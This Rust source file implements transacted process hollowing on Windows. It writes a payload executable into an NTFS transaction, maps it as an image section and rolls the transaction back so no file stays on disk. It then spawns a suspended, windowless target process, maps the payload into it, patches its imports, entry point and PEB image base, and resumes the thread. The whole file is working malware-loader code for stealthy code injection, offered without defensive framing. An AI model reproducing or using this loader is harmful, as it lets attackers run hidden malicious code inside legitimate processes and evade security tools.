#![feature(ptr_as_ref_unchecked)]
#![no_std]
#![allow(clippy::not_unsafe_ptr_arg_deref)]

extern crate alloc;

use core::ffi::{c_void, CStr};
use core::hint::spin_loop;
use core::mem::zeroed;
use core::ops::Deref;
use core::ptr::{copy_nonoverlapping, null, null_mut};
use utils::path::Path;
use utils::{log_debug, WideString};
use windows_sys::core::{PCWSTR, PWSTR};
use windows_sys::Win32::Foundation::{CloseHandle, BOOL, FALSE, GENERIC_READ, GENERIC_WRITE, HANDLE, INVALID_HANDLE_VALUE, NTSTATUS, STATUS_IMAGE_NOT_AT_BASE, STATUS_SUCCESS, TRUE};
use windows_sys::Win32::Security::SECURITY_ATTRIBUTES;
use windows_sys::Win32::Storage::FileSystem::{CreateFileTransactedW, CreateFileW, CreateTransaction, GetFileSize, RollbackTransaction, WriteFile, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, FILE_SHARE_READ, OPEN_EXISTING};
use windows_sys::Win32::System::Diagnostics::Debug::{GetThreadContext, SetThreadContext, WriteProcessMemory, CONTEXT, CONTEXT_INTEGER_AMD64, CONTEXT_INTEGER_X86, IMAGE_DIRECTORY_ENTRY_IMPORT, IMAGE_FILE_HEADER, IMAGE_NT_OPTIONAL_HDR64_MAGIC};
use windows_sys::Win32::System::LibraryLoader::{GetProcAddress, LoadLibraryA};
use windows_sys::Win32::System::Memory::{CreateFileMappingW, MapViewOfFile, UnmapViewOfFile, VirtualAlloc, FILE_MAP_READ, MEM_COMMIT, MEM_RESERVE, PAGE_READONLY, PAGE_READWRITE, SECTION_ALL_ACCESS, SECTION_FLAGS, SEC_IMAGE};
use windows_sys::Win32::System::SystemServices::{IMAGE_DOS_HEADER, IMAGE_IMPORT_BY_NAME, IMAGE_IMPORT_DESCRIPTOR, IMAGE_ORDINAL_FLAG32, IMAGE_ORDINAL_FLAG64};
use windows_sys::Win32::System::Threading::{ResumeThread, CREATE_NO_WINDOW, CREATE_SUSPENDED, DETACHED_PROCESS, PROCESS_INFORMATION, STARTUPINFOW};
use windows_sys::Win32::System::WindowsProgramming::{IMAGE_THUNK_DATA32, IMAGE_THUNK_DATA64};

type PVoid = *mut c_void;
type PByte = *mut u8;

macro_rules! module_function {
    (
        $module:expr,
        $name:ident,
        fn($($arg:ident : $arg_ty:ty),*) -> $ret:ty
    ) => {
        #[allow(non_snake_case, clippy::too_many_arguments, clippy::missing_transmute_annotations)]
        unsafe fn $name($($arg: $arg_ty),*) -> $ret {
            use windows_sys::Win32::System::LibraryLoader::{GetModuleHandleA, GetProcAddress};
            use core::mem::transmute;

            let h_module = unsafe {
                GetModuleHandleA(concat!($module, "\0").as_bytes().as_ptr() as _)
            };

            if h_module.is_null() {
                panic!("Couldn't get module handle for module {}", stringify!($module));
            }

            unsafe {
                (transmute::<_, unsafe extern "system" fn($($arg_ty),*) -> $ret>(
                    GetProcAddress(
                        h_module,
                        concat!(stringify!($name), "\0").as_bytes().as_ptr() as _,
                    )
                ))($($arg),*)
            }
        }
    };
}

module_function!(
    "kernel32",
    CreateProcessInternalW,
    fn(
        h_token: HANDLE,
        application_name: PCWSTR,
        command_line: PWSTR,
        process_attributes: *mut SECURITY_ATTRIBUTES,
        thread_attributes: *mut SECURITY_ATTRIBUTES,
        inherit_handles: BOOL,
        creation_flags: u32,
        environment: PVoid,
        current_directory: PCWSTR,
        startup_info: *mut STARTUPINFOW,
        process_information: *mut PROCESS_INFORMATION,
        p_handle: *mut HANDLE
    ) -> BOOL
);

module_function!(
    "ntdll",
    NtCreateSection,
    fn(
        section_handle: *mut HANDLE,
        desired_access: SECTION_FLAGS,
        object_attributes: *mut c_void,
        maximum_size: *mut i64,
        section_page_protection: u32,
        allocation_attributes: u32,
        file_handle: HANDLE
    ) -> NTSTATUS
);

module_function!(
    "ntdll",
    NtMapViewOfSection,
    fn(
        section_handle: HANDLE,
        process_handle: HANDLE,
        base_address: *mut PVoid,
        zero_bits: usize,
        commit_size: usize,
        section_offset: *mut i64,
        view_size: *mut usize,
        inherit_disposition: u32,
        allocation_type: u32,
        win32_protect: u32
    ) -> NTSTATUS
);

macro_rules! check {
    ($handle:expr) => {
        if $handle == INVALID_HANDLE_VALUE {
            return Err(INVALID_HANDLE_VALUE as _);
        }
    };
}

pub fn make_transacted_section<S>(dummy_name: S, payload: PByte, payload_size: usize) -> Result<HANDLE, i32>
where
    S: AsRef<str>
{
    let dummy_name = dummy_name.as_ref().to_wide();

    let options = 0u32;
    let isolation_lvl = 0u32;
    let isolation_flags = 0u32;
    let timeout = 0u32;

    let transaction = unsafe {
        CreateTransaction(
            null_mut(),
            null_mut(),
            options,
            isolation_lvl,
            isolation_flags,
            timeout,
            null_mut()
        )
    };

    check!(transaction);

    let transacted_file = unsafe {
        CreateFileTransactedW(
            dummy_name.as_ptr(),
            GENERIC_WRITE | GENERIC_READ,
            0,
            null_mut(),
            CREATE_ALWAYS,
            FILE_ATTRIBUTE_NORMAL,
            null_mut(),
            transaction,
            null_mut(),
            null_mut()
        )
    };

    check!(transacted_file);

    let mut written_len = 0;
    if unsafe {
        WriteFile(
            transacted_file,
            payload,
            payload_size as _,
            &mut written_len,
            null_mut()
        )
    } == FALSE {
        return Err(INVALID_HANDLE_VALUE as _);
    }

    let mut section: HANDLE = null_mut();
    if unsafe {
        NtCreateSection(
            &mut section as *mut _ as _,
            SECTION_ALL_ACCESS,
            null_mut(),
            null_mut(),
            PAGE_READONLY,
            SEC_IMAGE,
            transacted_file
        )
    } != STATUS_SUCCESS {
        return Err(INVALID_HANDLE_VALUE as _);
    }

    unsafe {
        CloseHandle(transacted_file)
    };

    if unsafe {
        RollbackTransaction(transaction)
    } == FALSE {
        return Err(INVALID_HANDLE_VALUE as _);
    }

    unsafe {
        CloseHandle(transaction)
    };

    Ok(section)
}

pub fn create_new_process_internal<C, S>(cmd_line: C, start_dir: S) -> Option<PROCESS_INFORMATION>
where
    C: AsRef<str>,
    S: AsRef<str>
{
    let mut cmd_line = cmd_line.as_ref().to_wide();
    let mut start_dir = start_dir.as_ref().to_wide();

    let mut si: STARTUPINFOW = unsafe { zeroed() };
    si.cb = size_of::<STARTUPINFOW>() as u32;

    let mut pi: PROCESS_INFORMATION = unsafe { zeroed() };

    let token: HANDLE = null_mut();

    let mut new_token: HANDLE = null_mut();
    if unsafe {
        CreateProcessInternalW(
            token,
            null_mut(),
            cmd_line.as_mut_ptr(),
            null_mut(),
            null_mut(),
            FALSE,
            CREATE_SUSPENDED | DETACHED_PROCESS | CREATE_NO_WINDOW,
            null_mut(),
            start_dir.as_mut_ptr(),
            &mut si as *mut _ as _,
            &mut pi as *mut _ as _,
            &mut new_token as *mut _ as _,
        )
    } == FALSE {
        None
    } else {
        Some(pi)
    }
}

pub fn map_buffer_into_process(pi: &PROCESS_INFORMATION, section: HANDLE) -> Option<PVoid> {
    let mut view_size = 0usize;
    let mut section_base_address: PVoid = null_mut();

    let status = unsafe {
        NtMapViewOfSection(
            section,
            pi.hProcess,
            &mut section_base_address,
            0,
            0,
            null_mut(),
            &mut view_size,
            1, // ViewShare
            0,
            PAGE_READONLY
        )
    };

    if status != STATUS_SUCCESS && status != STATUS_IMAGE_NOT_AT_BASE {
        None
    } else {
        Some(section_base_address)
    }
}

pub fn get_payload_buffer<S>(filename: S) -> Option<(PByte, usize)>
where
    S: AsRef<str>
{
    let filename = filename.as_ref().to_wide();
    let file = unsafe {
        CreateFileW(
            filename.as_ptr(),
            GENERIC_READ,
            FILE_SHARE_READ,
            null_mut(),
            OPEN_EXISTING,
            FILE_ATTRIBUTE_NORMAL,
            null_mut(),
        )
    };

    let mapping = unsafe {
        CreateFileMappingW(
            file,
            null_mut(),
            PAGE_READONLY,
            0,
            0,
            null_mut()
        )
    };

    if mapping.is_null() {
        unsafe {
            CloseHandle(file)
        };

        return None;
    }

    let dll_data = unsafe {
        MapViewOfFile(mapping, FILE_MAP_READ, 0, 0, 0)
    };

    let dll_raw_data = dll_data.Value as PByte;

    if dll_raw_data.is_null() {
        unsafe {
            CloseHandle(mapping);
            CloseHandle(file);
        }

        return None;
    }

    let payload_size = unsafe { GetFileSize(file, null_mut()) } as usize;

    let local_copy_address = unsafe {
        VirtualAlloc(
            null(),
            payload_size,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE
        )
    } as PByte;

    if local_copy_address.is_null() {
        return None;
    }

    unsafe {
        copy_nonoverlapping(
            dll_raw_data,
            local_copy_address,
            payload_size
        );
    }
    
    unsafe {
        UnmapViewOfFile(dll_data);
        CloseHandle(mapping);
        CloseHandle(file);
    }

    Some((local_copy_address, payload_size))
}

fn thread_context(pi: &PROCESS_INFORMATION) -> Option<CONTEXT> {
    const CONTEXT_FLAGS: u32 = if cfg!(target_arch = "x86_64") {
        CONTEXT_INTEGER_AMD64
    } else {
        CONTEXT_INTEGER_X86
    };

    let mut context: CONTEXT = unsafe { zeroed() };
    context.ContextFlags = CONTEXT_FLAGS;

    for _ in 0..20 {
        spin_loop();
    }

    if unsafe { GetThreadContext(pi.hThread, &mut context as *mut _ as _) == FALSE } {
        None
    } else {
        Some(context)
    }
}

fn update_remove_ep(pi: &PROCESS_INFORMATION, ep_va: u64) -> bool {
    let Some(mut context) = thread_context(pi) else {
        return false
    };

    context.Rcx = ep_va;

    unsafe {
        SetThreadContext(pi.hThread, &context) == TRUE
    }
}

fn get_remote_peb_address(pi: &PROCESS_INFORMATION) -> Option<u64> {
    thread_context(pi).map(|context| context.Rdx)
}

#[derive(PartialEq)]
enum PeArchitecture {
    X64,
    X86
}

fn pe_architecture(pe_buffer: PByte) -> PeArchitecture {
    let payload_dos_hdr = pe_buffer as *mut IMAGE_DOS_HEADER;

    unsafe {
        let e_lfanew = (*payload_dos_hdr).e_lfanew as usize;
        let headers_ptr = (pe_buffer as usize).wrapping_add(e_lfanew) as PByte;
        let optional_header_ptr = headers_ptr.add(4 + size_of::<IMAGE_FILE_HEADER>());
        let magic = *(optional_header_ptr as *const u16);

        match magic {
            IMAGE_NT_OPTIONAL_HDR64_MAGIC => PeArchitecture::X64,
            _ => PeArchitecture::X86
        }
    }
}

macro_rules! image_pe_header_field {
    ($pe_buffer:expr, $($field:ident).+) => {{
        use windows_sys::Win32::System::Diagnostics::Debug::{
            IMAGE_NT_HEADERS32, IMAGE_NT_HEADERS64
        };

        let payload_dos_hdr = $pe_buffer as *mut IMAGE_DOS_HEADER;

        unsafe {
            let e_lfanew = (*payload_dos_hdr).e_lfanew as usize;
            let headers_ptr = ($pe_buffer as usize).wrapping_add(e_lfanew) as PByte;

            if pe_architecture($pe_buffer) == PeArchitecture::X64 {
                let header = headers_ptr as *mut IMAGE_NT_HEADERS64;
                (*header)$(.$field)+
            } else {
                let header = headers_ptr as *mut IMAGE_NT_HEADERS32;
                (*header)$(.$field)+
            }
        }
    }};
}

fn get_ep_rva(pe_buffer: PByte) -> u32 {
    image_pe_header_field!(pe_buffer, OptionalHeader.AddressOfEntryPoint)
}

fn get_image_import_data_dir(pe_buffer: PByte) -> (*const IMAGE_IMPORT_DESCRIPTOR, u32) {
    let dir = image_pe_header_field!(pe_buffer, OptionalHeader.DataDirectory)[IMAGE_DIRECTORY_ENTRY_IMPORT as usize];
    let desc = unsafe { pe_buffer.add(dir.VirtualAddress as usize) } as *const IMAGE_IMPORT_DESCRIPTOR;
    (desc, dir.Size)
}

fn redirect_ep(loaded_pe: PByte, loaded_base: PVoid, pi: &PROCESS_INFORMATION) -> bool {
    let ep = get_ep_rva(loaded_pe);
    let ep_va = (loaded_base as u64 as usize).wrapping_add(ep as usize) as u64;

    update_remove_ep(pi, ep_va)
}

#[inline(always)]
fn manual_import_by_name(
    module_name: *const i8,
    function_name: *const i8,
    thunk_remote: PVoid,
    pi: &PROCESS_INFORMATION
) {
    let module = unsafe {
        LoadLibraryA(module_name as _)
    };

    if module.is_null() {
        log_debug!("Failed to load module {:?}\n", unsafe { CStr::from_ptr(module_name) });
        return;
    }
    
    let proc_adr = unsafe {
        GetProcAddress(
            module,
            function_name as _
        )
    };
    
    if unsafe {
        WriteProcessMemory(
            pi.hProcess,
            thunk_remote,
            &proc_adr as *const _ as PVoid,
            size_of::<usize>(),
            null_mut()
        )
    } == FALSE {
        log_debug!(
            "Failed to write import thunk at remote address {:p}\n",
            thunk_remote
        );
    }
}

#[inline(always)]
fn manual_import_by_ordinal(
    module_name: *const i8,
    ordinal: u64,
    thunk_remote: PVoid,
    _pi: &PROCESS_INFORMATION,
) {
    
}

macro_rules! fix_imports {
    ($pe:expr, $base:expr, $pi:expr, $img_thunk:ty, $ordinal_flag:expr) => {{
        let (mut desc, _) = get_image_import_data_dir($pe);

        unsafe {
            while (*desc).Name != 0 {
                let name_ptr = $pe.add((*desc).Name as usize) as *const i8;

                let mut thunk = if (*desc).Anonymous.OriginalFirstThunk != 0 {
                    $pe.add((*desc).Anonymous.OriginalFirstThunk as usize) as *const $img_thunk
                } else {
                    $pe.add((*desc).FirstThunk as usize) as *const $img_thunk
                };

                while (*thunk).u1.AddressOfData != 0 {
                    let thunk_rva = (thunk as usize) - ($pe as usize);
                    let remote_thunk = ($base as usize + thunk_rva) as PVoid;

                    if (*thunk).u1.Ordinal & $ordinal_flag != 0 {
                        let ordinal = ((*thunk).u1.Ordinal & 0xFFFF) as _;
                        manual_import_by_ordinal(name_ptr, ordinal, remote_thunk as *mut _, $pi);
                    } else {
                        let imp = $pe.add((*thunk).u1.AddressOfData as usize) as *const IMAGE_IMPORT_BY_NAME;
                        let func_ptr = ((*imp).Name.as_ptr()).add(2);
                        manual_import_by_name(name_ptr, func_ptr, remote_thunk as *mut _, $pi);
                    }

                    thunk = thunk.add(1)
                }

                desc = desc.add(1)
            }
        }
    }};
}

fn fix_imports(loaded_pe: PByte, loaded_base: PVoid, pi: &PROCESS_INFORMATION) {
    match pe_architecture(loaded_pe) {
        PeArchitecture::X64 => fix_imports!(loaded_pe, loaded_base, pi, IMAGE_THUNK_DATA64, IMAGE_ORDINAL_FLAG64),
        PeArchitecture::X86 => fix_imports!(loaded_pe, loaded_base, pi, IMAGE_THUNK_DATA32, IMAGE_ORDINAL_FLAG32)
    }
}

fn set_new_image_base(loaded_base: PVoid, pi: &PROCESS_INFORMATION) -> bool {
    let Some(remote_peb_address) = get_remote_peb_address(pi) else {
        return false
    };

    let img_base_size = size_of::<u64>();
    let offset = img_base_size * 2;
    let remote_img_base = (remote_peb_address as usize).wrapping_add(offset) as PVoid;

    unsafe {
        WriteProcessMemory(
            pi.hProcess,
            remote_img_base,
            &loaded_base as *const _ as PVoid,
            img_base_size,
            null_mut()
        ) == TRUE
    }
}

fn redirect_to_payload(loaded_pe: PByte, loaded_base: PVoid, pi: &PROCESS_INFORMATION) -> bool {
    fix_imports(loaded_pe, loaded_base, pi);

    if !redirect_ep(loaded_pe, loaded_base, pi) {
        return false
    }
    
    if !set_new_image_base(loaded_base, pi) {
        return false
    }
    
    true
}

pub fn hollow(target: &Path, payload: PByte, payload_size: usize) -> Option<PROCESS_INFORMATION> {
    let tmp = Path::temp_file("tmp");
    let _ = tmp.create_file();

    let section = make_transacted_section(tmp.deref(), payload, payload_size).ok()?;

    let pi = create_new_process_internal(target.deref(), target.parent()?.deref())?;

    let remote_base = map_buffer_into_process(&pi, section)?;

    if !redirect_to_payload(payload, remote_base, &pi) {
        None
    } else {
        unsafe {
            ResumeThread(pi.hThread)
        };

        Some(pi)
    }
}
